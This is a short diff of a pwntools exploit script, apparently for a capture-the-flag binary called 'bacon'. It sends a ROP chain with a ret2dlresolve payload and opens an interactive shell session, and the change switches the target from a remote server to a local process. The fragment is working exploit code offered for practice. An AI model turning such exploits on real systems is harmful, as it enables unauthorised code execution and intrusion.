@@ -12,8 +12,8 @@ raw_rop = rop.chain()
 
 payload = fit({0x40C: raw_rop, 0x42C: dlresolve.payload})
 
-#p = process("./bacon")
-p = remote("jh2i.com", 50032)
+p = process("./bacon")
+#p = remote("jh2i.com", 50032)
 
 p.send(payload)
 p.interactive()
